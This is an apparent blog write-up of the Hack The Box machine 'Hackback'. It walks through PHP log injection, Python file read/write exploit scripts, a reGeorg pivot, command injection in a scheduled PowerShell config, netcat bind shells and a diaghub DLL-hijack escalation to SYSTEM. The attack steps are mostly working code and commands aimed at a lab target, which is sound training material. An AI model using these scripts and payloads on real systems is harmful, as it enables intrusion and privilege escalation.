---
layout: single
title: Hackback - Hack The Box
excerpt: "Hackback took me a long time to do. There are so many steps required just to get a shell. For extra difficulty, AppLocker is enabled and an outbound firewall policy is configured to block reverse shells. This box has a bit of everything: fuzzing, php, asp (for pivoting with reGeorg), command injection in a Powershell script, some light reversing. For the privesc, I used the diaghub vulnerability and modified an existing exploit to get a bind shell through netcat."
date: 2019-07-06
classes: wide
header:
  teaser: /assets/images/htb-writeup-hackback/hackback_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - gophish
  - alpc
  - command injection
  - reversing
  - ntfs ads
  - powershell
  - regeorg
  - pivoting
  - fuzzing
  - php
  - asp
  - winrm
  - proxychains
---

![](/assets/images/htb-writeup-hackback/hackback_logo.png)

Hackback took me a long time to do. There are so many steps required just to get a shell. For extra difficulty, AppLocker is enabled and an outbound firewall policy is configured to block reverse shells. This box has a bit of everything: fuzzing, php, asp (for pivoting with reGeorg), command injection in a Powershell script, some light reversing. For the privesc, I used the diaghub vulnerability and modified an existing exploit to get a bind shell through netcat.

## Summary

- Find gophish website with default credentials
- In gophish templates, find vhosts for fake HTB site and admin portal
- Find hidden administration link from obfuscated JS code on the admin portal
- Wfuzz different parameters on webadmin page
- Determine that the log file name created is the SHA256 checksum of the IP address connecting to the fake HTB website
- Use SHA256 as the session ID in the show action of the webadmin page to view logs
- Injected PHP code in the log file through the fake HTB site login page and gain ability to read/write files on server
- Obtain user `simple` Windows credentials from `web.config.old` file extracted from the server
- Upload reGeorg tunnel.aspx to pivot to the remote machine
- Log in with WinRM through the SOCKS proxy & tunnel using the credentials found in `web.config.old`
- Exploit a command injection vulnerability in the `dellog.ps1` script and its associated `clean.ini` file to gain access to user `hacker`
- Use diaghub exploit to execute arbitrary code and get a bind shell as SYSTEM

## Detailed steps

### Nmap scan

The box is running a couple of different HTTP services on various ports: 80, 6666, 64831

```
# nmap -sC -sV -p- 10.10.10.128
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 23:21 EST
Nmap scan report for hackback.htb (10.10.10.128)
Host is up (0.0093s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
6666/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
64831/tcp open  ssl/unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain; charset=utf-8
|     Set-Cookie: _gorilla_csrf=MTU1MTU5NzI5M3xJamQwTlV4NE5reExOMkZXTTNGSE1qTjBjbXBQZVVsd2JIcGlkQ3RzV1cxTGVUZ3pVamxyVFUxdmNuYzlJZ289fCcrRBjaMGfHLMRcgH0dlzGlH8Cy6emg2qDuUnM3RFdx; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     X-Content-Type-Options: nosniff
|     Date: Sun, 03 Mar 2019 07:14:53 GMT
|     Content-Length: 19
|     page not found
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /login?next=%2F
|     Set-Cookie: _gorilla_csrf=MTU1MTU5NzI2N3xJbGhVYlVOa2RIbFpOVmw1VFRaMVJ5dHljV3BhU25aVVdtWTBhR2MwYlZsYWJEaG9aR014VDBoNlMwazlJZ289fDWKudYR9rrjWpWCasQcOixRNCRPK5eaVMKphjXIBDPB; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     Date: Sun, 03 Mar 2019 07:14:27 GMT
|     Content-Length: 38
|     href="/login?next=%2F">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Location: /login?next=%2F
|     Set-Cookie: _gorilla_csrf=MTU1MTU5NzI2N3xJbVkxUVdwb1FtRjBjM0ZGWm5BdkwzZHRNbkZVTXl0Qk5VWkZaVFZwVjBoaldUSjVTemQ2VG5sR1dsazlJZ289fMGxoxDhwdZVndica_2TocbOxXZbpClx4Ony-cgy4a9K; HttpOnly; Secure
|     Vary: Accept-Encoding
|     Vary: Cookie
|     Date: Sun, 03 Mar 2019 07:14:27 GMT
|_    Content-Length: 0
| ssl-cert: Subject: organizationName=Gophish
```

### Enumerating port 80

The standard web server on port 80 doesn't have much except the image of a donkey:

![](/assets/images/htb-writeup-hackback/donkey.png)

I checked for stego but since this is a 40 pts box from the Donkeys team there's probably not going to be much stego crap on this one.

### Enumerating port 6666

Next I checked out port 6666 and found some custom web application. It errors out expecting commands:

![](/assets/images/htb-writeup-hackback/6666_missing_command.png)

I fuzzed the application with wfuzz and found the `/help` URI we can get a list of the available commands:

![](/assets/images/htb-writeup-hackback/6666_help.png)

The commands basically do what they say, they execute some function and provide the output in JSON format:

![](/assets/images/htb-writeup-hackback/6666_whoami.png)

![](/assets/images/htb-writeup-hackback/6666_list.png)

I checked for command injection but didn't find any parameters that I could pass to the commands. So I moved on to the next port.

### Enumerating port 64831

I can't use HTTP to connect to port 64381:

![](/assets/images/htb-writeup-hackback/64831_http.png)

The nmap scan already picked up that it was running HTTPS, so I switched to HTTPS and found a Gophish application running. Gophish is an Open-Source phishing framework that makes it easy to launch phishing campaigns by using templates and running an integrated webserver to track the results.

![](/assets/images/htb-writeup-hackback/64831_https.png)

A quick google search shows that the default credentials for Gophish are `admin` / `gophish`. I tried those and was able to log in to the Gophish application:

![](/assets/images/htb-writeup-hackback/64831_gophish_mainpage.png)

The Gophish database is pretty much empty except there are a few email templates already created:

![](/assets/images/htb-writeup-hackback/64831_templates.png)

The templates contain a couple of generic fake emails use for phishing. I noticed two interesting vhosts in the templates.

![](/assets/images/htb-writeup-hackback/64831_template_admin.png)

![](/assets/images/htb-writeup-hackback/64831_template_hackthebox.png)

Based on the info I found I added `www.hackthebox.htb`, `hackthebox.htb` and `admin.hackback.htb` to my local host file.

### Fake HTB site

`hackthebox.htb` doesn't seem to be a valid vhost but `www.hackthebox.htb` is working and displays the login prompt for the fake HTB site.

![](/assets/images/htb-writeup-hackback/fakehtb.png)

The form doesn't do anything when we enter the credentials, it just loads the same page again. So this is probably not meant to be exploited.

### Admin page

The `admin.hackback.htb` shows a login prompt for an application that I don't recognize.

![](/assets/images/htb-writeup-hackback/admin_login.png)

Both `Lost your Password?` and `Don't have An account?` link return a 404 page.

I tried a couple of username / password combination but didn't get anywhere. Again, because this is a hard box, I guessed it wasn't going to be bruteforcable or anything trivial like this.

The HTML comment contains something odd:

![](/assets/images/htb-writeup-hackback/admin_comment.png)

There's a link to javascript directory that's commented out. I tried fetching the `js/.js` file but got a 404 message. Because directory indexing is disabled, I fired up gobuster and scanned `/js` for js files.

```
# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x js -u http://admin.hackback.htb/js
/private.js (Status: 200)
```

That `private.js` file contains some obfuscated javascript. I noticed that the `ine x=` pattern repeats a couple of times in the source code so I figured it must be using some simple character substitution. I pasted the code in CyberChef and tried ROT13:

![](/assets/images/htb-writeup-hackback/js_plaintext.png)

I still don't know what the code actually does so I just copy/pasted it in my browser's javascript console and examined each variable after the code was run. I checked the variables in the order in which they appear in the source code.

![](/assets/images/htb-writeup-hackback/js_console.png)

![](/assets/images/htb-writeup-hackback/js_variables.png)

So based on the hidden message, there's a secret directory `/2bb6916122f1da34dcd916421e531578` that should allow us to get access. When I tried to access that directory, I got a 302 redirect instead of a 404 so I knew this was a valid directory.

Next I used gobuster to look for any ASP or PHP page in that directory:

```
# gobuster -q -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php,asp,aspx -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578
/. (Status: 200)
/webadmin.php (Status: 302)
```

If I just browse to `/2bb6916122f1da34dcd916421e531578/webadmin.php` I get a 302 back to the main page. I checked out the different parameters found in the js file and noted the following:

1. The `list` action requires the `site` parameter set.

2. If we put an invalid `site` parameter we get a `Wrong target!` error mesasge

3. If we put an invalid `password` parameter we get a `Wrong secret key!` error message

4. The `init` action expects a `session` parameter but return a `Wrong identifier!` when we try a random value

5. The `exec` action returns a `Missing command` error message. I guessed that it's expecting a `command` or `cmd` parameters. Adding `cmd` returns a `Exited x` message when we issue a command, where x = the length of the command sent. I couldn't figure out if any command was being executed or not. I tried some sleep commands to see if anything was being executed but I always got the message back without any delay. I figured this was probably a troll from the Donkeys team so I moved on.

The next thing I did was fuzz the `password` parameter:

```
# wfuzz -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=FUZZ"

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000001:  C=302      0 L	       3 W	     17 Ch	  "123456"
000002:  C=302      0 L	       3 W	     17 Ch	  "12345"
000003:  C=302      0 L	       3 W	     17 Ch	  "123456789"
000004:  C=302      0 L	       3 W	     17 Ch	  "password"
000005:  C=302      0 L	       3 W	     17 Ch	  "iloveyou"
000006:  C=302      0 L	       3 W	     17 Ch	  "princess"
000007:  C=302      0 L	       3 W	     17 Ch	  "1234567"
000008:  C=302      7 L	      15 W	    197 Ch	  "12345678"
000009:  C=302      0 L	       3 W	     17 Ch	  "abc123"
000010:  C=302      0 L	       3 W	     17 Ch	  "nicole"
```

The password `12345678` quickly popped out as shown above.

I then tried the `GET /2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=12345678` query on the admin page:

![](/assets/images/htb-writeup-hackback/admin_list.png)

Note: I still get a 302 redirect so initially I missed it when I was using the browser to check it. With Burp, it showed up in the response.

The `list` command shows the content of a directory that contains some log files. I tried using the `show` action to see the content of the log file by specifying the filename in the `session` parameter but I always got a `Wrong identifier!` error message. I tried various parameters and I got stuck at this point for a long time until I realized that when I try to log in to the fake HTB website found earlier a new log file is created.

![](/assets/images/htb-writeup-hackback/admin_list2.png)

The filename is always the same, even after a box reset so there is something unique associated to my own machine. The only thing unique to my session is the IP address from my machine. I checked the SHA256 hash for my IP 10.10.14.23 and I got `fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79`: a match for the log file name.

I tried the `show` action with the session ID for my IP address: `/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79`

![](/assets/images/htb-writeup-hackback/admin_show.png)

The log file contains the POST parameters that I sent on the fake HTB site. So at this point I was hoping I could get RCE by injecting PHP code into the logs. I tested this theory by sending the following payload in the password field: `<?php echo (1+1); ?>`

I checked the logs and saw that my PHP was executed:

![](/assets/images/htb-writeup-hackback/confirm_php_rce.png)

Adding a bunch of PHP code in the same log file can get pretty messy when testing multiple payloads so I clean up the log file everytime I test different payloads by first calling the `init` action to reset the log file.

I tried unsuccessfully to get a reverse shell but realized that all the common functions used for RCE appeared to be blocked. There's also an outbound firewall configured on the box so we can't get a connection back.

Listing files and directories wasn't blocked and I could also read files. I wrote a script that does the following:

- Cleans up the logfile by calling the `init` action
- If only one parameter is specified, it'll use the `scandir` function to list the directory contents
- If two parameters are specified, it'll read the directory + file with the `file_get_contents` function

Warning, bad python code below:

```python
#!/usr/bin/python

import base64
import requests
import sys

# Clean up the log file

r = requests.get("http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=init&site=hackthebox&password=12345678&session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79");
print r.status_code

if len(sys.argv) == 2: # List directories
	data = {
		"_token": "23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA",
		"username": "test@test.com",
		"password": "<?php print_r(scandir('%s')); ?>" % sys.argv[1],
		"submit": ""
	}
	r = requests.post("http://www.hackthebox.htb", data=data)
	print r.status_code

	# Get output
	r = requests.get("http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79", allow_redirects=False);
	print r.text

elif len(sys.argv) == 3: # Fetch a file	
	data = {
		"_token": "23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA",
		"username": "test@test.com",
		"password": "<?php echo(file_get_contents('%s')); ?>" % (sys.argv[1]+'/'+sys.argv[2]),
		"submit": ""
	}
	r = requests.post("http://www.hackthebox.htb", data=data)
	print r.status_code

	# Get output
	r = requests.get("http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=fe02f7f54552f5f7544d9d8963b4b88f43d2408985c12999752ee5c0e7fc3e79", allow_redirects=False);
	print r.text
	with open("out.txt", "wb") as f:
		f.write((r.text.encode('utf-16')))
```

The output of the script looks like this when enumerating directories:

```
# ./hackback_read.py ..
200
200
[04 March 2019, 12:49:47 AM] 10.10.14.23 - Username: test@test.com, Password: Array
(
    [0] => .
    [1] => ..
    [2] => 2bb6916122f1da34dcd916421e531578
    [3] => App_Data
    [4] => aspnet_client
    [5] => css
    [6] => img
    [7] => index.php
    [8] => js
    [9] => logs
    [10] => web.config
    [11] => web.config.old
)

# ./hackback_read.py ../..
200
200
[04 March 2019, 12:49:54 AM] 10.10.14.23 - Username: test@test.com, Password: Array
(
    [0] => .
    [1] => ..
    [2] => admin
    [3] => facebook
    [4] => hackthebox
    [5] => paypal
    [6] => twitter
)
```

As we saw above, there's a `web.config` file that can potentially contain sensitive information.

I downloaded it with `./hackback_read.py ../web.config`

```
# ./hackback_read.py ../web.config
200
200
[04 March 2019, 12:51:22 AM] 10.10.14.23 - Username: test@test.com, Password: 

root@ragingunicorn:~/htb/hackback# cat web.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
[...]](root@ragingunicorn:~/htb/hackback# ./hackback_read.py /inetpub/wwwroot/new_phish/admin web.config
200
200
[04 March 2019, 12:53:51 AM] 10.10.14.23 - Username: test@test.com, Password: <?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>)
```

Nothing interesting in this one but the `web.config.old` contains some credentials:

```
# ./hackback_read.py /inetpub/wwwroot/new_phish/admin web.config.old
200
200
[04 March 2019, 12:54:18 AM] 10.10.14.23 - Username: test@test.com, Password: <?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"                 
            userName="simple" 
            password="ZonoProprioZomaro:-("/>
     </authentication>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>
```

Username: `simple`
Password: `ZonoProprioZomaro:-(`

I can't use these credentials at the moment since there's no other service exposed but they'll be useful later on.

### Tunneling our way in

I can also write files to the target system using the same PHP code execution trick. I wrote another variant of my previous script that uses the `file_put_contents` function to write files to the disk.

```python
#!/usr/bin/python

import base64
import requests
import sys

# Clean up the log file

r = requests.get("http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=init&site=hackthebox&password=12345678&session=fb6f90c58d1e2f1a7b86546f3300d6d199ac4c0b5309ada3203b2042b3443a56");
print r.status_code

# Base64 encoded the file we want to write

with open(sys.argv[2]) as f:
	payload = base64.b64encode(f.read())

# print payload

data = {
	"_token": "23I6TdlO18ZPtXYQPeHZyAY4Y8Z9wq1ntgvP8YdA",
	"username": "test@test.com",
	"password": "<?php echo(file_put_contents(\"%s\",base64_decode(\"%s\")));echo ' *****'; ?>" % (sys.argv[1],payload),
	"submit": ""
}
r = requests.post("http://www.hackthebox.htb", data=data)
print r.status_code

# Call the PHP code to write the file

r = requests.get("http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=fb6f90c58d1e2f1a7b86546f3300d6d199ac4c0b5309ada3203b2042b3443a56", allow_redirects=False);
print r.text
```

I used [reGeorg](https://github.com/sensepost/reGeorg) to pivot to the machine. reGeorg has two main components to it: a client-side python script that acts as a local SOCKS proxy and the remote .aspx file running on the target server.

To write the .aspx to the webserver directory I used my script above:

```
# ./hackback_write.py "/inetpub/wwwroot/new_phish/admin/2bb6916122f1da34dcd916421e531578/tunnel.aspx" tunnel.aspx
200
200
[04 July 2019, 09:55:44 PM] 10.10.14.11 - Username: test@test.com, Password: 4960 *****
```

Then I started the local component of reGeorg:

```
# python reGeorgSocksProxy.py -l 127.0.0.1 -p 1080 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx

    
                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad
  
   
[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:1080], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

So now I have a SOCKS proxy listening on port 1080 and tunneling the traffic to the Hackback machine. There are probably some ports listening only on the localhost so I can find out by running nmap through the tunnel. I specify the `-sT` flag so nmap does a regular TCP socket with the Connect() method and not the default `-sS` SYN method which doesn't work with proxychains.

```
# proxychains nmap -sT -p 22,80,135,139,443,445,3389,5985,5986,8080 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-05 20:46 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.34s latency).

PORT     STATE  SERVICE
22/tcp   closed ssh
80/tcp   open   http
135/tcp  open   msrpc
139/tcp  closed netbios-ssn
443/tcp  closed https
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server
5985/tcp open   wsman
5986/tcp closed wsmans
8080/tcp open   http-proxy
```

There's a few additional ports open like WinRM and RDP. I can't RDP in because I don't have the proper privileges:

![](/assets/images/htb-writeup-hackback/rdpfail_simple.png)

To connect to WinRM running on port 5985 I used the [Alamot's ruby script](https://github.com/Alamot/code-snippets/tree/master/winrm). I edited it to put the credentials and the right endpoint.

```ruby
#!/usr/bin/ruby

require 'winrm'

conn = WinRM::Connection.new(
  endpoint: 'http://127.0.0.1:5985/wsman',
  user: 'hackback\simple',
  password: 'ZonoProprioZomaro:-(',
  :no_ssl_peer_verification => true
                            )

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```

I can connect successfully and now have a shell as user `simple`:

```
# proxychains ./winrm-simple.rb 
ProxyChains-3.1 (http://proxychains.sf.net)
PS hackback\simple@HACKBACK Documents>

PS hackback\simple@HACKBACK util> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

PS hackback\simple@HACKBACK util> net users simple
User name                    simple
Full Name                    simple
[...]

Local Group Memberships      *project-managers     *Remote Management Use
                             *Users                
```

No user flag yet though.

### Escalating to user hacker

That WinRM shell was very slow so I spawned a bind shell on port 4442 with netcat to speed things up a little bit.

Initially I tried uploading netcat to `\programdata` but found out that AppLocker was blocking it so instead I uploaded it to a directory not controlled by AppLocker:`./hackback_write.py "/Windows/System32/spool/drivers/color/nc.exe" nc.exe`

```
C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe -L -p 4442
[...]
# proxychains nc -nv 127.0.0.1 4442
ProxyChains-3.1 (http://proxychains.sf.net)
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:4442.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\util>whoami
whoami
hackback\simple
```

There's an interesting directory `c:\util` that contains a bunch of different tools:

```
C:\util>dir       
dir
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of C:\util

07/05/2019  03:11 AM    <DIR>          .
07/05/2019  03:11 AM    <DIR>          ..
03/08/2007  01:12 AM           139,264 Fping.exe
03/29/2017  07:46 AM           312,832 kirbikator.exe
12/14/2018  04:42 PM             1,404 ms.hta
12/14/2018  04:30 PM    <DIR>          PingCastle
02/29/2016  01:04 PM           359,336 PSCP.EXE
02/29/2016  01:04 PM           367,528 PSFTP.EXE
05/04/2018  12:21 PM            23,552 RawCap.exe
               7 File(s)      1,204,017 bytes
               3 Dir(s)  92,174,512,128 bytes free
```

There's also an hidden directory `c:\util\scripts`:

```
C:\util>dir /ah
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of C:\util

12/21/2018  07:21 AM    <DIR>          scripts
               0 File(s)              0 bytes
               1 Dir(s)  92,174,512,128 bytes free

C:\util\scripts>dir
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of C:\util\scripts

12/21/2018  06:44 AM                84 backup.bat
07/05/2019  12:54 AM               402 batch.log
12/13/2018  03:56 PM                93 clean.ini
12/08/2018  10:17 AM             1,232 dellog.ps1
07/05/2019  12:54 AM                35 log.txt
12/13/2018  03:54 PM    <DIR>          spool
               5 File(s)          1,846 bytes
               1 Dir(s)  92,184,432,640 bytes free
```

I guessed that the `clean.ini` file is somehow used by the `dellog.ps1` script as input parameters:

```
C:\util\scripts>type clean.ini
type clean.ini
[Main] 
LifeTime=100 
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles

C:\util\scripts>type dellog.ps1
type dellog.ps1
Access is denied.
```

I can't read the `dellog.ps1` script but the `clean.ini` is writable by user `simple` since he's a member of the `project-managers` group:

```
C:\util\scripts>icacls clean.ini
icacls clean.ini
clean.ini NT AUTHORITY\SYSTEM:(F)
          BUILTIN\Administrators:(F)
          HACKBACK\project-managers:(M)

Successfully processed 1 files; Failed processing 0 files
```

The `LogFile` parameter is vulnerable to command injection. The powershell script that wipes the logs uses that parameter to pipe the output of another command so we can use the `&` character to execute arbitrary commands after the log file has been written to.

I uploaded the following batch file that binds a shell on port 4441. The `snow.txt` file is just there so I can check if the batch file was run by the scheduler.

```
echo check > c:\programdata\snow.txt
C:\Windows\System32\spool\drivers\color\nc.exe -e cmd.exe -L -p 4441
```

```
# ./hackback_write.py "/programdata/a.bat" a.bat
```

Then I modified the `clean.ini` as follows:

```
[Main]
LifeTime=9999
LogFile=c:\util\scripts\log.txt & c:\programdata\a.bat
Directory=c:\users\hacker
```

I couldn't upload it directly to `c:\util\scripts\clean.ini` so I copied it to `\programdata` first then copied it over from the command line.

```
root@ragingunicorn:~/htb/hackback# ./hackback_write.py "/programdata/clean.ini" clean.ini
```

```
C:\util\scripts>copy c:\programdata\clean.ini clean.ini
copy c:\programdata\clean.ini clean.ini
Overwrite clean.ini? (Yes/No/All): yes
yes
        1 file(s) copied.
```

After a while the batch file is executed (probably some scheduler job set up) and I can connect to the bind shell:

```
# proxychains nc -nv 127.0.0.1 4441
ProxyChains-3.1 (http://proxychains.sf.net)
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:4441.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
hackback\hacker

C:\Windows\system32>cd \users\hacker\desktop
cd \users\hacker\desktop

C:\Users\hacker\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of C:\Users\hacker\Desktop

02/09/2019  03:34 PM    <DIR>          .
02/09/2019  03:34 PM    <DIR>          ..
02/09/2019  03:34 PM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  92,183,654,400 bytes free

C:\Users\hacker\Desktop>type user.txt
type user.txt
92244...
```

### Privesc

There's a suspicious service that user `hacker` can stop & start:

```
C:\Windows\system32>sc query userlogger

SERVICE_NAME: userlogger 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0


HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\userlogger
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    c:\windows\system32\UserLogger.exe
    ObjectName    REG_SZ    LocalSystem
    DisplayName    REG_SZ    User Logger
    Description    REG_SZ    This service is responsible for logging user activity
```

I downloaded the file `UserLogger.exe` to figure out what the service does. When I opened it in IDA I found out it as UPX packed:

![](/assets/images/htb-writeup-hackback/userlogger1.png)

After unpacking it with `upx -d userlogger.exe` I was able to open it and see the functions in IDA. I found the function I was looking for. It seems to create a file based on a supplied argument and it also appends `.log` as the extension.

![](/assets/images/htb-writeup-hackback/userlogger2.png)

When I started the service with `sc start userlogger c:\windows\system\yolo` it created the `c:\windows\system32\yolo.log` file:

```
C:\Projects>dir c:\windows\system32\yolo.log
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of c:\windows\system32

07/05/2019  03:25 AM                58 yolo.log
               1 File(s)             58 bytes
               0 Dir(s)  92,148,129,792 bytes free

C:\Projects>type c:\windows\system32\yolo.log
Logfile specified!
Service is starting
Service is running
```

I have full privileges to that file:

```
C:\Projects>icacls c:\windows\system32\yolo.log

c:\windows\system32\yolo.log Everyone:(F)

Successfully processed 1 files; Failed processing 0 files
```

So that means I can replace it with an arbitrary DLL and load it using the Diagnostics Hub Standard Collector Service privilege escalation exploit.

I modified the exploit from [https://github.com/realoriginal/alpc-diaghub](https://github.com/realoriginal/alpc-diaghub)

![](/assets/images/htb-writeup-hackback/alpc1.png)

I created a simple DLL that executes netcat to spawn another bind shell on port 4300:

![](/assets/images/htb-writeup-hackback/pwndll1.png)

I then uploaded both files to their respective directories. The .exe needs to be in `/Windows/System32/spool/drivers/color` so I can avoid AppLocker.
```
# ./hackback_write.py "/Windows/System32/spool/drivers/color/ALPC-TaskSched-LPE.exe" ALPC-TaskSched-LPE.exe
# ./hackback_write.py "/Windows/System32/yolo.log" PwnDll.dll
```

Executing the exploit...

```
C:\Windows\System32\spool\drivers\color>ALPC-TaskSched-LPE.exe
ALPC-TaskSched-LPE.exe
[+] Loading DLL
Creating directory: C:\Windows\System32\spool\drivers\color\..\..\..\..\..\programdata\etw
[+] If everything has gone well, you should have a SYSTEM shell!
```

And now I have a bind shell as SYSTEM:

```
# proxychains nc -nv 127.0.0.1 4300
ProxyChains-3.1 (http://proxychains.sf.net)
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:4300.
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

It looks like the Donkeys have one final troll, the `root.txt` is hidden and doesn't contain the flag:

```
C:\Users\Administrator\Desktop>dir /ah
dir /ah
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of C:\Users\Administrator\Desktop

02/06/2019  11:20 AM               282 desktop.ini
02/09/2019  03:37 PM             1,958 root.txt
               2 File(s)          2,240 bytes
               0 Dir(s)  92,184,543,232 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt

                                __...----..
                             .-'           `-.
                            /        .---.._  \
                            |        |   \  \ |
                             `.      |    | | |        _____
                               `     '    | | /    _.-`      `.
                                \    |  .'| //'''.'            \
                                 `---'_(`.||.`.`.'    _.`.'''-. \
                                    _(`'.    `.`.`'.-'  \\     \ \
                                   (' .'   `-._.- /      \\     \ |
                                  ('./   `-._   .-|       \\     ||
                                  ('.\ | | 0') ('0 __.--.  \`----'/
                             _.--('..|   `--    .'  .-.  `. `--..'
               _..--..._ _.-'    ('.:|      .  /   ` 0 `   \
            .'         .-'        `..'  |  / .^.           |
           /         .'                 \ '  .             `._
        .'|                              `.  \`...____.----._.'
      .'.'|         .                      \ |    |_||_||__|
     //   \         |                  _.-'| |_ `.   \
     ||   |         |                     /\ \_| _  _ |
     ||   |         /.     .              ' `.`.| || ||
     ||   /        ' '     |        .     |   `.`---'/
   .' `.  |       .' .'`.   \     .'     /      `...'
 .'     \  \    .'.'     `---\    '.-'   |
)/\ / /)/ .|    \             `.   `.\   \
 )/ \(   /  \   |               \   | `.  `-.
  )/     )   |  |             __ \   \.-`    \
         |  /|  )  .-.      //' `-|   \  _   /
        / _| |  `-'.-.\     ||    `.   )_.--'
        )  \ '-.  /  '|     ''.__.-`\  | 
       /  `-\  '._|--'               \  `.
       \    _\                       /    `---.
       /.--`  \                      \    .''''\
       `._..._|                       `-.'  .-. |
                                        '_.'-./.'
```

